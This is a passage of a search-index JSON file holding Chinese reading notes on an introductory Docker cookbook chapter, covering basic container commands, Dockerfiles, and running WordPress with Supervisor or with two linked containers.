2\uff08\u5373httpd\uff09\u3001PHP\u4ee5\u53ca\u6700\u65b0\u7248\u672c\u7684WordPress\u3002\u4f60\u5c06\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u7528\u4e8eWordPress\u7684\u6570\u636e\u5e93\u3002\u5728\u8be5\u8303\u4f8b\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0cWordPress\u6570\u636e\u5e93\u7528\u6237\u540d\u4e3aroot\uff0c\u5bc6\u7801\u4e5f\u662froot\uff0c\u6570\u636e\u5e93\u540d\u4e3awordpress\u3002\u5982\u679c\u4f60\u60f3\u5bf9\u6570\u636e\u5e93\u7684\u914d\u7f6e\u8fdb\u884c\u4fee\u6539\uff0c\u9700\u8981\u540c\u65f6\u4fee\u6539wp-config.php\u548cDockerfile\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff0c\u5e76\u8ba9\u5b83\u4eec\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002 Dockerfile\u6587\u4ef6\u7528\u6765\u63cf\u8ff0\u4e00\u4e2aDocker\u955c\u50cf\u662f\u5982\u4f55\u6784\u5efa\u7684\uff0c\u540e\u9762\u7ae0\u8282\u4f1a\u6709\u5173\u4e8eDockerfile\u7684\u8be6\u7ec6\u8bf4\u660e\u3002\u5982\u679c\u8fd9\u662f\u4f60\u7b2c\u4e00\u6b21\u4f7f\u7528Dockerfile\u6587\u4ef6\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u4ee5\u540e\u518d\u5b66\u4e60Dockerfile\uff08\u53c2\u89c1\u8303\u4f8b2.3\u5bf9Dockerfile\u7684\u4ecb\u7ecd\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 FROM ubuntu:14.04 RUN apt-get update \uff06\uff06 apt-get -y install \\ apache2 \\ php5 \\ php5-mysql \\ supervisor \\ wget RUN echo 'mysql-server mysql-server/root_password password root' | \\ debconf-set-selections \uff06\uff06 \\ echo 'mysql-server mysql-server/root_password_again password root' | \\ debconf-set-selections RUN apt-get install -qqy mysql-server RUN wget http://wordpress.org/latest.tar.gz \uff06\uff06 \\ tar xzvf latest.tar.gz \uff06\uff06 \\ cp -R ./wordpress/* /var/www/html \uff06\uff06 \\ rm /var/www/html/index.html RUN ( /usr/bin/mysqld_safe \uff06 ) ; sleep 5 ; mysqladmin -u root -proot create wordpress COPY wp-config.php /var/www/html/wp-config.php COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf EXPOSE 80 CMD [ \"/usr/bin/supervisord\" ] Supervisor\u7684\u914d\u7f6e\u6587\u4ef6supervisord.conf\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 5 6 7 8 9 [supervisord] nodaemon = true [program\uff1amysqld] command = /usr/bin/mysqld_safe autostart = true autorestart = true user = root [program\uff1ahttpd] command = /bin/bash -c \"rm -rf /run/httpd/* \uff06\uff06 /usr/sbin/apachectl -D FOREGROUND\" \u8fd9\u91cc\u5b9a\u4e49\u4e86\u4e24\u4e2a\u88ab\u76d1\u63a7\u548c\u8fd0\u884c\u7684\u670d\u52a1\uff1amysqld\u548chttpd\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982autorestart\u548cautostart\u7b49\u9009\u9879\u3002\u6700\u91cd\u8981\u7684\u6307\u4ee4\u662fcommand\uff0c\u5176\u5b9a\u4e49\u4e86\u5982\u4f55\u8fd0\u884c\u6bcf\u4e2a\u7a0b\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0cDocker\u5bb9\u5668\u53ea\u9700\u8981\u8fd0\u884c\u4e00\u4e2a\u524d\u53f0\u8fdb\u7a0b\uff1asupervisord\u3002\u4eceDockerfile\u4e2d\u7684 CMD [\"/usr/bin/supervisord\"] \u8fd9\u4e00\u884c\u4e5f\u80fd\u770b\u51fa\u6765\u3002 \u5728\u4f60\u7684Docker\u4e3b\u673a\u4e0a\uff0c\u6784\u5efa\u8be5\u955c\u50cf\u5e76\u542f\u52a8\u4e00\u4e2a\u540e\u53f0\u5bb9\u5668\u3002\u5982\u679c\u6309\u7167\u4f8b\u5b50\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u4e86\u57fa\u4e8eVagrant\u7684\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u3002 1 2 3 $ cd /vagrant $ docker build -t wordpress . $ docker run -d -p 80 \uff1a80 wordpress \u5bb9\u5668\u542f\u52a8\u540e\u8fd8\u4f1a\u5728\u5bbf\u4e3b\u673a\u548cDocker\u5bb9\u5668\u4e4b\u95f4\u4e3a80\u7aef\u53e3\u8fdb\u884c\u7aef\u53e3\u6620\u5c04\u3002\u73b0\u5728\u53ea\u9700\u8981\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00http://\uff1cip of docker_host\uff1e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230WordPress\u7684\u914d\u7f6e\u9875\u9762\u4e86\u3002 1.15.3 \u8ba8\u8bba \u5c3d\u7ba1\u901a\u8fc7Supervisor\u5728\u4e00\u4e2a\u5bb9\u5668\u5185\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u5e94\u7528\u670d\u52a1\u5de5\u4f5c\u8d77\u6765\u975e\u5e38\u5b8c\u7f8e\uff0c\u4f46\u662f\u4f60\u6700\u597d\u8fd8\u662f\u4f7f\u7528\u591a\u4e2a\u5bb9\u5668\u6765\u8fd0\u884c\u4e0d\u540c\u7684\u670d\u52a1\u3002\u8fd9\u80fd\u5145\u5206\u5229\u7528\u5bb9\u5668\u7684\u9694\u79bb\u4f18\u52bf\uff0c\u4e5f\u80fd\u5e2e\u52a9\u4f60\u521b\u5efa\u57fa\u4e8e\u5fae\u670d\u52a1\u8bbe\u8ba1\u601d\u60f3\u7684\u5e94\u7528\uff08\u53c2\u89c1\u300a\u5fae\u670d\u52a1\u8bbe\u8ba1\u300b\uff09\u3002\u6700\u7ec8\u8fd9\u4e5f\u5c06\u4f1a\u4f7f\u4f60\u7684\u5e94\u7528\u66f4\u5177\u5f39\u6027\u548c\u53ef\u6269\u5c55\u6027\u3002 1.15.4 \u53c2\u8003 Supervisor \u6587\u6863\uff08 http://supervisord.org/index.html \uff09 Docker Supervisor \u6587\u6863\uff08 https://docs.docker.com/articles/using_supervisord/ \uff09 1.16 \u4f7f\u7528\u4e24\u4e2a\u94fe\u63a5\u5728\u4e00\u8d77\u7684\u5bb9\u5668\u8fd0\u884c WordPress \u535a\u5ba2\u7a0b\u5e8f 1.16.1 \u95ee\u9898 \u4f60\u5e0c\u671b\u901a\u8fc7\u5bb9\u5668\u6765\u8fd0\u884c\u4e00\u4e2aWordPress\u7f51\u7ad9\uff08 http://wordpress.com/ \uff09\uff0c\u4f46\u662f\u4f60\u4e0d\u60f3\u8ba9MySQL\u548cWordPress\u5728\u540c\u4e00\u4e2a\u5bb9\u5668\u4e2d\u8fd0\u884c\u3002\u4f60\u65f6\u523b\u8c28\u8bb0\u5bf9\u5173\u6ce8\u70b9\u8fdb\u884c\u5206\u79bb\u7684\u539f\u5219\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0d\u540c\u7ec4\u4ef6\u8fdb\u884c\u89e3\u8026\u3002 1.16.2 \u89e3\u51b3\u65b9\u6848 \u542f\u52a8\u4e24\u4e2a\u5bb9\u5668\uff1a\u4e00\u4e2a\u8fd0\u884c\u6765\u81eaDocker Hub\uff08 http://hub.docker.com/ \uff09\u7684\u5b98\u65b9WordPress\uff0c\u53e6\u4e00\u4e2a\u8fd0\u884cMySQL\u6570\u636e\u5e93\u3002\u8fd9\u4e24\u4e2a\u5bb9\u5668\u901a\u8fc7Docker\u547d\u4ee4\u884c\u5de5\u5177\u7684 \u2014\u2014link \u9009\u9879\u94fe\u63a5\u5728\u4e00\u8d77\u3002 \u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7684WordPress\uff08 https://hub.docker.com/_/wordpress \uff09\u548cMySQL\uff08 https://hub.docker.com/_/mysql/ \uff09\u955c\u50cf\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 $ docker pull wordpress:latest $ docker pull mysql:latest $ docker images","title":"\u7b2c1\u7ae0 Docker\u5165\u95e8"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#111-dockerhello-world","text":"","title":"1.11 \u5728docker\u4e2d\u8fd0\u884cHello World"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1111","text":"\u4f60\u5df2\u7ecf\u62e5\u6709\u4e00\u53f0Docker\u4e3b\u673a\uff0c\u60f3\u8fd0\u884c\u4f60\u7684\u7b2c\u4e00\u4e2a\u5bb9\u5668\u3002\u4f60\u60f3\u5b66\u4e60\u5bb9\u5668\u7684\u4e0d\u540c\u751f\u547d\u5468\u671f\u3002\u6bd4\u5982\uff0c\u4f60\u60f3\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\u5e76\u5728\u5176\u4e2d\u6253\u5370hello world\u3002","title":"1.11.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1112","text":"\u4f60\u5df2\u7ecf\u89c1\u8fc7\u4e86 1 $ docker ps \u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u7528\u4e8e\u5217\u51fa\u6240\u6709\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u3002 \u9996\u5148\uff0c\u4f60\u60f3\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u3002\u8ba9\u6211\u4eec\u7acb\u5373\u5f00\u59cb\uff0c\u6267\u884c docker run \u547d\u4ee4\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker run busybox echo hello world \u5bb9\u5668\u6765\u6e90\u4e8e\u955c\u50cf\u3002 docker run \u547d\u4ee4\u4e0e\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u955c\u50cf\u3002","title":"1.11.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1113","text":"\u5982\u679c\u5217\u51fa\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\uff0c\u4f60\u4f1a\u53d1\u73b0\u6ca1\u6709\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u3002\u8fd9\u662f\u56e0\u4e3a\u5bb9\u5668\u4e00\u65e6\u5b8c\u6210\u4e86\u5b83\u7684\u5de5\u4f5c\uff08\u8f93\u51fahello world\uff09\uff0c\u5c31\u505c\u6b62\u4e86\u3002\u4f46\u662f\u5bb9\u5668\u5e76\u6ca1\u6709\u5b8c\u5168\u6d88\u5931\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7 1 $ docker ps -a \u547d\u4ee4\u770b\u5230\u8fd9\u4e2a\u5bb9\u5668\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7 1 $ docker rm 8f7089b187e8 \u547d\u4ee4\u5c06\u8fd9\u4e2a\u5bb9\u5668\u6c38\u4e45\u5220\u9664\u3002\u8be5\u5bb9\u5668\u4f7f\u7528\u7684\u955c\u50cf\u5df2\u7ecf\u88ab\u4e0b\u8f7d\u5230\u4e86\u672c\u5730\uff0c 1 $ docker image \u547d\u4ee4\u5c06\u4f1a\u8f93\u51fa\u8fd9\u4e2a\u955c\u50cf\u7684\u4fe1\u606f\u3002 \u5982\u679c\u4efb\u4f55\u8fd0\u884c\u4e2d\u6216\u8005\u5df2\u7ecf\u505c\u6b62\u7684\u5bb9\u5668\u90fd\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u955c\u50cf\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7 1 $ docker rmi busybox \u547d\u4ee4\u6765\u5220\u9664\u8fd9\u4e2a\u955c\u50cf\u3002 \u8fd0\u884cecho\u547d\u4ee4\u867d\u7136\u5f88\u6709\u8da3\uff0c\u4f46\u662f\u83b7\u5f97\u4e00\u4e2a\u7ec8\u7aef\u4f1a\u8bdd\u4f1a\u66f4\u597d\u3002\u8981\u60f3\u5728\u5bb9\u5668\u4e2d\u8fd0\u884c /bin/bash \uff0c\u4f60\u9700\u8981\u4f7f\u7528 -t \u548c -i \u53c2\u6570\u6765\u83b7\u5f97\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u4f1a\u8bdd\uff0c\u4e0b\u9762\u4ee5\u4f7f\u7528Ubuntu\u955c\u50cf\u4e3a\u4f8b\u8fdb\u884c\u8bf4\u660e\u3002 1 $ docker run -t -i ubuntu:14.04 /bin/bash \u4f60\u4f1a\u770b\u5230Docker\u4e0b\u8f7d\u7684ubuntu:14.04\u955c\u50cf\u7531\u591a\u4e2a\u5c42\u7ec4\u6210\uff0c\u7136\u540e\u4f60\u5f97\u5230\u4e86\u4e00\u4e2a\u5bb9\u5668\u4e2droot\u6743\u9650\u7684\u4f1a\u8bdd\u3002\u63d0\u793a\u7b26\u4e5f\u663e\u793a\u4e86\u8fd9\u4e2a\u5bb9\u5668\u7684ID\u3002\u4e00\u65e6\u4f60\u63a8\u51fa\u8fd9\u4e2a\u7ec8\u7aef\uff0c\u8be5\u5bb9\u5668\u5c31\u4f1a\u505c\u6b62\u8fd0\u884c\uff0c\u5c31\u50cf\u6211\u4eec\u524d\u9762\u7684hello world\u4f8b\u5b50\u4e00\u6837\u3002","title":"1.11.3 \u8ba8\u8bba"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#112-docker","text":"","title":"1.12 \u4ee5\u540e\u53f0\u65b9\u5f0f\u8fd0\u884cdocker\u5bb9\u5668"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1121","text":"\u4f60\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u4ee5\u4ea4\u4e92\u65b9\u5f0f\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\uff0c\u4f46\u662f\u4f60\u60f3\u4ee5\u540e\u53f0\u65b9\u5f0f\u8fd0\u884c\u4e00\u4e2a\u670d\u52a1\u3002","title":"1.12.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1122","text":"\u4f7f\u7528 docker run \u7684 -d \u9009\u9879\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5c06\u4f1a\u5728\u5bb9\u5668\u4e2d\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684\u57fa\u4e8ePython\u7684HTTP\u670d\u52a1\u5668\u3002 1 $ docker run -d -p 1234 :1234 python:2.7 python -m SimpleHTTPServer 1234","title":"1.12.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1123","text":"\u8fd9\u4e2a -d \u53c2\u6570\u4f1a\u8ba9\u5bb9\u5668\u5728\u540e\u53f0\u8fd0\u884c\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c exec \u547d\u4ee4\u6765\u542f\u52a8\u4e00\u4e2abash shell\uff0c\u518d\u6b21\u8fdb\u5165\u5230\u8be5\u5bb9\u5668\u4e2d\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker exec - ti 9 d7cebd75dcf / bin / bash \u5728\u5b98\u65b9\u6587\u6863\uff08 https://docs.docker.com/reference/run/ \uff09[^1]\u4e2d\u8fd8\u6709 docker run \u7684\u5176\u4ed6\u5f88\u591a\u9009\u9879\u3002 [^1] \u539f\u6587\u5982\u6b64\uff0c\u73b0\u5728\u5e94\u8be5\u662f https://docs.docker.com/engine/reference/commandline/run/","title":"1.12.3 \u8ba8\u8bba"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#113","text":"","title":"1.13 \u521b\u5efa\u3001\u542f\u52a8\u3001\u505c\u6b62\u548c\u79fb\u9664\u5bb9\u5668"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1131","text":"\u4f60\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u5e76\u8ba9\u5b83\u5728\u540e\u53f0\u8fd0\u884c\u3002\u4f60\u5e0c\u671b\u5b66\u4e60\u57fa\u672c\u547d\u4ee4\u6765\u7ba1\u7406\u5bb9\u5668\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u3002","title":"1.13.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1132","text":"\u4f7f\u7528 Docker \u547d\u4ee4\u884c\u7684 create \u3001 start \u3001 stop \u3001 kill \u548c rm \u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u5728\u8fd9\u4e9b\u547d\u4ee4\u540e\u9762\u52a0\u4e0a -h \u6216\u8005 \u2014\u2014h \u9009\u9879\u6765\u67e5\u770b\u5b83\u4eec\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u6216\u8005\u53ea\u8f93\u5165\u547d\u4ee4\u800c\u4e0d\u6307\u5b9a\u4efb\u4f55\u53c2\u6570\uff08\u6bd4\u5982 docker create \uff09\u3002","title":"1.13.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1133","text":"\u5728\u8303\u4f8b 1.12 \u4e2d\uff0c\u4f60\u901a\u8fc7 docker run \u81ea\u52a8\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\u3002\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7 docker create \u547d\u4ee4\u6765\u521b\u5efa\u4e00\u4e2a\u5bb9\u5668\u3002\u7ee7\u7eed\u4f7f\u7528\u4e0a\u9762\u7b80\u5355\u7684HTTP\u670d\u52a1\u5668\u7684\u4f8b\u5b50\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u8fd9\u91cc\u6ca1\u6709\u6307\u5b9a -d \u9009\u9879\u3002\u5f53\u521b\u5efa\u5bb9\u5668\u4e4b\u540e\uff0c\u4f60\u9700\u8981\u8fd0\u884c docker start \u6765\u542f\u52a8\u8fd9\u4e2a\u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 $ docker create -P \u2014\u2014expose = 1234 python:2.7 python -m SimpleHTTPServer 1234 $ docker ps -a $ docker start a842945e2414 $ docker ps \u8981\u60f3\u505c\u6b62\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\uff0c\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 docker kill \uff08\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u53d1\u9001SIGKILL\u4fe1\u53f7\u5230\u5bb9\u5668\uff09\u6216\u8005 docker stop \uff08\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u53d1\u9001SIGTERM\u5230\u5bb9\u5668\uff0c\u5982\u679c\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u5bb9\u5668\u8fd8\u6ca1\u6709\u505c\u6b62\uff0c\u5219\u4f1a\u518d\u53d1\u9001SIGKILL\u4fe1\u53f7\u5f3a\u5236\u505c\u6b62\uff09\u3002\u8fd9\u4e24\u4e2a\u547d\u4ee4\u6700\u7ec8\u7684\u7ed3\u679c\u662f\u505c\u6b62\u5bb9\u5668\u7684\u8fd0\u884c\uff0c\u8be5\u5bb9\u5668\u5c06\u4e0d\u4f1a\u51fa\u73b0\u5728 docker ps \u8fd4\u56de\u7684\u8fd0\u884c\u4e2d\u5bb9\u5668\u5217\u8868\u4e2d\u3002\u4f46\u662f\uff0c\u5bb9\u5668\u8fd8\u6ca1\u6709\u5b8c\u5168\u6d88\u5931\uff08\u6bd4\u5982\u5bb9\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u8fd8\u5728\uff09\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 docker restart \u6765\u91cd\u542f\u8fd9\u4e2a\u5bb9\u5668\uff0c\u6216\u8005\u901a\u8fc7 docker rm \u79fb\u9664\u8fd9\u4e2a\u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 3 4 5 $ docker restart a842945e2414 $ docker ps $ docker kill a842945e2414 $ docker rm a842945e2414 $ docker ps -a \u5982\u679c\u4f60\u6709\u5f88\u591a\u505c\u6b62\u4e2d\u7684\u5bb9\u5668\u5f85\u5220\u9664\uff0c\u53ef\u4ee5\u5728\u4e00\u6761\u547d\u4ee4\u4e2d\u4f7f\u7528\u5d4c\u5957\u7684 shell \u6765\u5220\u9664\u6240\u6709\u5bb9\u5668\u3002 docker ps \u7684 -q \u9009\u9879\u53ea\u4f1a\u8fd4\u56de\u5bb9\u5668\u7684 ID \u4fe1\u606f\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker rm $( docker ps -a -q )","title":"1.13.3 \u8ba8\u8bba"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#114-dockerfiledocker","text":"","title":"1.14 \u4f7f\u7528Dockerfile\u6784\u5efaDocker\u955c\u50cf"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1141","text":"\u4f60\u77e5\u9053\u4e86\u5982\u4f55\u4ece\u516c\u6709\u7684Docker registry\u4e0b\u8f7d\u955c\u50cf\uff0c\u4f46\u662f\u4f60\u60f3\u6784\u5efa\u81ea\u5df1\u7684Docker\u955c\u50cf\u3002","title":"1.14.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1142","text":"\u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\u3002Dockerfile\u662f\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u5b83\u8bb0\u8ff0\u4e86Docker\u6784\u5efa\u4e00\u4e2a\u955c\u50cf\u6240\u9700\u8981\u7684\u8fc7\u7a0b\uff0c\u5305\u62ec\u5b89\u88c5\u8f6f\u4ef6\u5305\u3001\u521b\u5efa\u6587\u4ef6\u5939\u3001\u5b9a\u4e49\u73af\u5883\u53d8\u91cf\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9b\u64cd\u4f5c\u3002\u5728\u7b2c2\u7ae0\u4e2d\u6211\u4eec\u4f1a\u5bf9Dockerfile\u548c\u6784\u5efa\u955c\u50cf\u505a\u66f4\u6df1\u5165\u7684\u8bf4\u660e\u3002\u672c\u8303\u4f8b\u4e2d\u53ea\u4f1a\u6d89\u53ca\u6784\u5efa\u955c\u50cf\u7684\u57fa\u672c\u6982\u5ff5\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\uff0c\u6211\u4eec\u5047\u8bbe\u4f60\u8981\u57fa\u4e8e busybox \u955c\u50cf\u521b\u5efa\u4e00\u4e2a\u65b0\u955c\u50cf\uff0c\u5e76\u5b9a\u4e49\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u3002busybox \u955c\u50cf\u662f\u4e00\u4e2a\u5305\u542b\u4e86 busybox\uff08 http://www.busybox.net/about.html \uff09\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684 Docker \u955c\u50cf\uff0c\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u5f88\u591a Unix \u5b9e\u7528\u5de5\u5177\u6253\u5305\u5230\u4e86\u4e00\u4e2a\u5355\u4e00\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002\u5728\u4e00\u4e2a\u7a7a\u6587\u4ef6\u5939\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a Dockerfile \u7684\u6587\u4ef6\uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 FROM busybox ENV foo = bar \u53ef\u4ee5\u901a\u8fc7 docker build \u547d\u4ee4\u6765\u6784\u5efa\u4e00\u4e2a\u65b0\u955c\u50cf\uff0c\u5e76\u547d\u540d\u4e3a busybox2 \uff0c\u5982\u4e0b\u6240\u793a\u3002 1 $ docker build -t busybox2 . \u6784\u5efa\u7ed3\u675f\u4e4b\u540e\uff0c\u4f60\u5c31\u80fd\u901a\u8fc7 docker images \u547d\u4ee4\u770b\u5230\u65b0\u6784\u5efa\u7684\u955c\u50cf\u4e86\u3002\u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u65b0\u955c\u50cf\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\uff0c\u68c0\u67e5\u4e00\u4e0b\u5176\u4e2d\u662f\u5426\u6709\u4e00\u4e2a\u540d\u4e3a foo \u7684\u73af\u5883\u53d8\u91cf\uff0c\u5e76\u4e14\u5176\u503c\u88ab\u8bbe\u7f6e\u4e3a\u4e86 bar \uff0c\u5982\u4e0b\u6240\u793a\u3002 1 2 $ docker images $ docker run busybox2 env | grep foo","title":"1.14.2 \u89e3\u51b3\u65b9\u6848"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1143","text":"Dockerfile \u53c2\u8003\u6307\u5357\uff08 https://docs.docker.com/reference/builder/ \uff09[^1] \u7b2c 2 \u7ae0\uff0c\u5176\u4e2d\u4f1a\u5bf9\u521b\u5efa\u955c\u50cf\u548c\u5171\u4eab\u955c\u50cf\u8fdb\u884c\u8bf4\u660e [^1] \u73b0\u5728\u662f https://docs.docker.com/engine/reference/builder/","title":"1.14.3 \u53c2\u8003"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#115-supervisorwordpress","text":"","title":"1.15 \u5728\u5355\u4e00\u5bb9\u5668\u4e2d\u4f7f\u7528Supervisor\u8fd0\u884cWordPress"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1151","text":"\u4f60\u5df2\u7ecf\u77e5\u9053\u4e86\u5982\u4f55\u5c06\u4e24\u4e2a\u5bb9\u5668\u94fe\u63a5\u5230\u4e00\u8d77\uff08\u53c2\u89c1\u8303\u4f8b1.16\uff09\uff0c\u4e0d\u8fc7\u4f60\u5e0c\u671b\u5728\u4e00\u4e2a\u5bb9\u5668\u4e2d\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u6240\u6709\u670d\u52a1\u3002\u4ee5\u8fd0\u884cWordPress\u4e3a\u4f8b\uff0c\u4f60\u60f3\u5728\u4e00\u4e2a\u5bb9\u5668\u4e2d\u540c\u65f6\u8fd0\u884cMySQL\u548cHTTPD\u670d\u52a1\u3002\u7531\u4e8eDocker\u8fd0\u884c\u7684\u662f\u524d\u53f0\u8fdb\u7a0b\uff0c\u6240\u4ee5\u4f60\u9700\u8981\u627e\u5230\u4e00\u79cd\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u201c\u524d\u53f0\u201d\u8fdb\u7a0b\u7684\u65b9\u5f0f\u3002","title":"1.15.1 \u95ee\u9898"},{"location":"reading_notes/docker_cookbook/getting_started_with_docker/#1152","text":"\u4f7f\u7528Supervisor\uff08 http://supervisord.org/index.html \uff09\u6765\u76d1\u63a7\u5e76\u8fd0\u884cMySQL\u548cHTTPD\u3002Supervisor\u4e0d\u662f\u4e00\u4e2ainit\u7cfb\u7edf\uff0c\u800c\u662f\u4e00\u4e2a\u7528\u6765\u63a7\u5236\u591a\u4e2a\u8fdb\u7a0b\u7684\u666e\u901a\u7a0b\u5e8f\u3002 \u672c\u8303\u4f8b\u662f\u4e00\u4e2a\u5728\u5bb9\u5668\u4e2d\u4f7f\u7528Supervisor\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u8fdb\u7a0b\u7684\u4f8b\u5b50\u3002\u4f60\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u57fa\u7840\u5728\u4e00\u4e2aDocker\u955c\u50cf\u4e2d\u8fd0\u884c\u591a\u4e2a\u670d\u52a1\uff08\u6bd4\u5982SSH\u3001Nginx\uff09\u3002\u672c\u8303\u4f8b\u4e2d\uff0cWordPress\u7684\u914d\u7f6e\u662f\u4e00\u4e2a\u6700\u7cbe\u7b80\u7684\u53ef\u884c\u914d\u7f6e\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002 \u793a\u4f8b\u4e2d\u7684\u6587\u4ef6\u53ef\u4ee5\u5728GitHub\uff08 https://github.com/how2dock/docbook/tree/master/ch01/supervisor \uff09\u4e0b\u8f7d\u3002\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u5305\u62ec\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8\u865a\u62df\u673a\u7684Vagrantfile\uff0cDocker\u8fd0\u884c\u5728\u8be5\u865a\u62df\u673a\u4e2d\uff0c\u8fd8\u5305\u542b\u4e00\u4e2aDockerfile\u6765\u5b9a\u4e49\u8981\u521b\u5efa\u7684\u955c\u50cf\uff0c\u6b64\u5916\u8fd8\u6709\u4e00\u4e2aSupervisor\u7684\u914d\u7f6e\u6587\u4ef6\uff08supervisord.conf\uff09\u548c\u4e00\u4e2aWordPress\u7684\u914d\u7f6e\u6587\u4ef6\uff08wp-config.php\uff09\u3002 \u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528Vagrant\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u7684Dockerfile\u3001supervisord\u548cWordPress\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u81ea\u5df1\u7684Docker\u4e3b\u673a\u4e0a\u6765\u5b89\u88c5\u3002 \u4e3a\u4e86\u8fd0\u884cWordPress\uff0c\u4f60\u9700\u8981\u5b89\u88c5MySQL\u3001Apache 